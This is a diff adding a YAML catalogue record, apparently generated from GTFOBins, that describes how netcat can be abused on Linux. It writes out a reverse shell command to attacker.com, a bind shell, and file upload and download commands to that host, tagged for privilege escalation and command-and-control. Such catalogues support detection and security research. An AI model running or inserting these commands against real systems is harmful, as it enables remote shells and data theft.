@@ -1,0 +1,128 @@
+id: gtfobins/nc/reverse-shell/sudo
+type: binary
+platform: linux
+name: nc
+phases:
+- execution
+- command-and-control
+- privilege-escalation
+capabilities:
+- reverse-shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: nc -e /bin/sh attacker.com 12345
+  comment: This only works with netcat traditional.
+references:
+- https://gtfobins.github.io/gtfobins/nc/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        nc:
+          functions:
+            bind-shell:
+            - code: nc -l -p 12345 -e /bin/sh
+              comment: This only works with netcat traditional.
+              connector: tcp-client
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            download:
+            - code: nc -l -p 12345 >/path/to/output-file
+              comment: The file is actually written by the invoking shell.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tcp-client
+            - code: nc attacker.com 12345 >/path/to/output-file
+              comment: The file is actually written by the invoking shell.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tcp-server
+            reverse-shell:
+            - code: nc -e /bin/sh attacker.com 12345
+              comment: This only works with netcat traditional.
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+              listener: tcp-server
+            upload:
+            - code: nc -l -p 12345 </path/to/input-file
+              comment: The file is actually read by the invoking shell.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tcp-client
+            - code: nc attacker.com 12345 </path/to/input-file
+              comment: The file is actually read by the invoking shell.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tcp-server
+    upstream_url: https://gtfobins.github.io/gtfobins/nc/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: reverse-shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:083aabecac3934da440d8d1a768ea29026d0d2970ae6ec1dc1b3817c2465026c
